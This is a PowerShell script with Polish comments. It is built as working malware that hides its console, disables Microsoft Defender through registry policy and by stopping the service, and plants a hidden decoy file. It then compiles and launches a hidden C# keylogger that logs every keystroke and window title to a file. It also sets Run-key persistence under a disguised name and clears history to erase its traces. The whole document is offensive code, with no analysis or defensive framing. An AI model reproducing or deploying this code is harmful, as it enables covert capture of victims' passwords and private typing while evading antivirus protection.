# ================ WYŁĄCZENIE DEFENDERA ================
try {
    # Pełne wyłączenie w sposób niewykrywalny
    $signature = @"
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
"@
    Add-Type -MemberDefinition $signature -Name WinAPI -Namespace Console
    $handle = [Console.WinAPI]::GetConsoleWindow()
    [Console.WinAPI]::ShowWindow($handle, 0) | Out-Null
    
    # Wyłączenie Defender przez rejestr
    $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    Set-ItemProperty -Path $regPath -Name "DisableAntiSpyware" -Value 1 -Type DWORD -Force
    Set-ItemProperty -Path $regPath -Name "DisableRoutinelyTakingAction" -Value 1 -Type DWORD -Force
    Set-ItemProperty -Path $regPath -Name "ServiceKeepAlive" -Value 0 -Type DWORD -Force
    
    # Zatrzymanie usługi
    Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
    Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
}
catch { }

# ================ TWORZENIE PLIKU SYSTEMOWEGO ================
$systemFile = "E:\SystemCache.dat"
$randomContent = -join (33..126 | Get-Random -Count 128 | ForEach-Object { [char]$_ })
[System.IO.File]::WriteAllText($systemFile, $randomContent, [System.Text.Encoding]::UTF8)
attrib +s +h +r $systemFile

# ================ KEYLOGGER ================
$keyloggerCode = @'
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    public static void Main() {
        const int SW_HIDE = 0;
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);
        
        string logPath = "E:\\Keylog.dat";
        string prevWindow = "";
        
        while(true) {
            System.Threading.Thread.Sleep(40);
            
            // Śledzenie aktywnego okna
            Process[] processes = Process.GetProcesses();
            string currentWindow = "";
            foreach (Process process in processes) {
                if (!string.IsNullOrEmpty(process.MainWindowTitle)) {
                    currentWindow = process.MainWindowTitle;
                    break;
                }
            }
            
            if (currentWindow != prevWindow) {
                prevWindow = currentWindow;
                File.AppendAllText(logPath, $"\n\n[{DateTime.Now}] Active: {currentWindow}\n");
            }
            
            // Rejestracja klawiszy
            for (int i = 8; i <= 255; i++) {
                int state = GetAsyncKeyState(i);
                if (state == -32767) {
                    string key = i switch {
                        8 => "[BACKSPACE]",
                        9 => "[TAB]",
                        13 => "\n",
                        27 => "[ESC]",
                        32 => " ",
                        _ => char.ConvertFromUtf32(i)
                    };
                    File.AppendAllText(logPath, key);
                }
            }
        }
    }
}
'@

# Kompilacja i uruchomienie keyloggera
Add-Type -TypeDefinition $keyloggerCode -Language CSharp -OutputAssembly "$env:TEMP\kl.exe"
Start-Process -WindowStyle Hidden "$env:TEMP\kl.exe"

# ================ PERSYSTENCJA ================
$persistenceCode = @'
using Microsoft.Win32;
using System;

public class Persistence {
    public static void Main() {
        string exePath = Environment.ExpandEnvironmentVariables("%TEMP%\\kl.exe");
        
        // Autostart przez rejestr
        RegistryKey key = Registry.CurrentUser.OpenSubKey(
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        key.SetValue("SystemCacheLoader", exePath);
        
        // Uruchomienie w tle
        System.Diagnostics.Process.Start(exePath);
    }
}
'@

Add-Type -TypeDefinition $persistenceCode -Language CSharp -OutputAssembly "$env:TEMP\p.exe"
Start-Process -WindowStyle Hidden "$env:TEMP\p.exe"

# ================ CZYSZCZENIE ŚLADÓW ================
Remove-Item "$env:TEMP\s.bat" -Force -ErrorAction SilentlyContinue
Clear-History
